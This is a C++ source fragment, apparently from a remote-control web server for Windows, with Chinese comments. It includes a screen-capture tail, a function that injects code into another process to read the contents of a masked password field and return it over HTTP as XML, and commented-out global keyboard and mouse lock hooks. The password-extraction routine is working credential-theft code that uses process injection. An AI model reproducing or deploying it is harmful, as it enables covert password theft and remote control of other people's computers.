		dwret=cImageF::IPF_EncodeJPEG(&bih,lpbuffer,lpbuffer,quality);
		lpbits=lpbuffer;	
	}//?if(::GetDIBits(hWndDC,

	::SelectObject(hMemDC, hOldBmp);
	::DeleteObject(hMemBmp);
	::DeleteDC(hMemDC);
	::ReleaseDC(hWnd, hWndDC);
	return dwret;
}

//------------------获取指定密码窗口的密码--------------------------------
#include "cInjectDll.h"
typedef HWND (WINAPI *PWindowFromPoint)(POINT);
typedef long (WINAPI *PGetWindowLong)(HWND,int);
typedef BOOL (WINAPI *PPostMessage)(HWND,UINT,WPARAM,LPARAM);
typedef int  (WINAPI *PGetWindowText)(HWND,LPTSTR,int);
typedef struct _TGETPSWDINFO
{
	POINT pt; //鼠标当前坐标点
	PWindowFromPoint pfnWindowFromPoint;
	PGetWindowLong pfnGetWindowLong;
	PGetWindowText pfnGetWindowText;
	char retPswdBuf[64];
}TGETPSWDINFO;
DWORD WINAPI GetPswdFromWind(INJECTLIBINFO *pInfo)
{
	TGETPSWDINFO *p=(TGETPSWDINFO *)&pInfo->dwParam;
	
	if(p==NULL || p->pfnWindowFromPoint==NULL)
		pInfo->dwReturnValue=3;
	else{
		HWND hWnd=(*p->pfnWindowFromPoint)(p->pt);
		if(hWnd==NULL) pInfo->dwReturnValue=2;
		else{
			long l=(*p->pfnGetWindowLong)(hWnd,GWL_STYLE);
			if((l&ES_PASSWORD)==0) pInfo->dwReturnValue=1; //非PASSWOD 窗口
			l=(*p->pfnGetWindowText)(hWnd,p->retPswdBuf,sizeof(p->retPswdBuf)-1);
			p->retPswdBuf[l]=0;
		}
	}
	return 0;
}
//获取密码窗口的密码
bool webServer:: httprsp_getpswdfromwnd(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp,httpSession &session)
{
	const char *ptr; char buf[256];
	RECT rc; TGETPSWDINFO info;
	rc.left=rc.top=0; info.pt.x=info.pt.y=0;
	::memset((void *)&info,0,sizeof(TGETPSWDINFO));
	HWND hwnd=(HWND)atol(session["cap_hwnd"].c_str());
	if(hwnd!=NULL) GetWindowRect(hwnd,&rc);
	if( (ptr=httpreq.Request("x")) ) info.pt.x=atoi(ptr);
	if( (ptr=httpreq.Request("y")) ) info.pt.y=atoi(ptr);
	info.pt.x+=rc.left; info.pt.y+=rc.top;
	
	DWORD dwret,pid=0;
	if( (hwnd=::WindowFromPoint(info.pt)) ) GetWindowThreadProcessId(hwnd,&pid);
	
	//初始化指定的函数指针
	info.pfnGetWindowLong= (PGetWindowLong)GetProcAddress(GetModuleHandle
						("User32.dll"),"GetWindowLongA");	
	info.pfnGetWindowText= (PGetWindowText)GetProcAddress(GetModuleHandle
						("User32.dll"),"GetWindowTextA");
	info.pfnWindowFromPoint= (PWindowFromPoint)GetProcAddress(GetModuleHandle
						("User32.dll"),"WindowFromPoint");
	cInjectDll inject(NULL); //返回0 成功
	dwret=inject.Call(pid,(PREMOTEFUNC)&GetPswdFromWind,(PVOID)&info,sizeof(TGETPSWDINFO));
	int buflen=sprintf(buf,"<?xml version=\"1.0\" encoding=\"gb2312\" ?>\r\n"
				"<xmlroot>\r\n"
				"<result>%d</result>\r\n"
				"<pid>%d</pid>\r\n"
				"<wtext>%s</wtext>\r\n"
				"</xmlroot>",dwret,pid,info.retPswdBuf);
	
	httprsp.NoCache();//CacheControl("No-cache");
	//设置MIME类型，默认为HTML
	httprsp.set_mimetype(MIMETYPE_XML);
	//设置响应内容长度
	httprsp.lContentLength(buflen); 
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(buflen,buf,-1);
	return true;
}

//-------------------------------鼠标键盘锁定------------------------------
/*--------------不起作用，必须以dll方式做全局挂钩--------------------------
static HHOOK g_hKBLockHook=NULL;//锁定键盘鼠标钩子句柄
static HHOOK g_hMSLockHook=NULL;

//一下定义在winuser.h中但必须定义了 #if (_WIN32_WINNT >= 0x0400)
#ifndef LLMHF_INJECTED

#define WH_KEYBOARD_LL 13
#define WH_MOUSE_LL 14
// Structure used by WH_KEYBOARD_LL
typedef struct tagKBDLLHOOKSTRUCT {
    DWORD   vkCode;
    DWORD   scanCode;
    DWORD   flags;
    DWORD   time;
    DWORD   dwExtraInfo;
} KBDLLHOOKSTRUCT, FAR *LPKBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;

// Structure used by WH_MOUSE_LL
typedef struct tagMSLLHOOKSTRUCT {
    POINT   pt;
    DWORD   mouseData;
    DWORD   flags;
    DWORD   time;
    DWORD   dwExtraInfo;
} MSLLHOOKSTRUCT, FAR *LPMSLLHOOKSTRUCT, *PMSLLHOOKSTRUCT;

#endif

//锁定键盘鼠标处理钩子
LRESULT CALLBACK kbLockProc(
  int nCode,      // hook code
  WPARAM wParam,  // message identifier
  LPARAM lParam   // 
)
{	
	KBDLLHOOKSTRUCT *p=(KBDLLHOOKSTRUCT *)lParam;
	if(p->dwExtraInfo==Wutils::mskbEvent_dwExtraInfo || nCode<0 )
	{
		return CallNextHookEx(g_hKBLockHook,nCode,wParam,lParam);
	}
	return 1;
}
//锁定键盘鼠标处理钩子
LRESULT CALLBACK msLockProc(
  int nCode,      // hook code
  WPARAM wParam,  // message identifier
  LPARAM lParam   // mouse coordinates
)
{	
	MSLLHOOKSTRUCT *p=(MSLLHOOKSTRUCT *)lParam;
	if(p->dwExtraInfo==Wutils::mskbEvent_dwExtraInfo || nCode<0 )
	{
		return CallNextHookEx(g_hMSLockHook,nCode,wParam,lParam);
	}
	return 1;
}

//安装或卸载键盘鼠标钩子
bool SetMouseKeybHook(bool bInstall)
{
	if(bInstall) //安装键盘鼠标钩子
	{
		if(g_hKBLockHook || g_hMSLockHook) return true; //已经安装过
		HMODULE hmdl=GetModuleHandle(NULL);
		printf("aaaaaaaa hmdl=%d, GetLastError=%d \r\n",hmdl,GetLastError());
		g_hKBLockHook=::SetWindowsHookEx(WH_KEYBOARD_LL,kbLockProc,hmdl,0);
		printf("g_hKBLockHook =%d, GetLastError=%d \r\n",g_hKBLockHook,GetLastError());
		g_hMSLockHook=::SetWindowsHookEx(WH_MOUSE_LL,msLockProc,hmdl,0);
		printf("g_hMSLockHook =%d, GetLastError=%d \r\n",g_hMSLockHook,GetLastError());
		if(g_hKBLockHook && g_hMSLockHook) return true;
	}
	//卸载鼠标钩子
	if(g_hKBLockHook) UnhookWindowsHookEx(g_hKBLockHook);
	if(g_hMSLockHook) UnhookWindowsHookEx(g_hMSLockHook);
	g_hKBLockHook=NULL; g_hMSLockHook=NULL;
	return (bInstall)?false:true;
}
bool ifInstallMouseKeyHook() { return (g_hKBLockHook || g_hMSLockHook); }
*/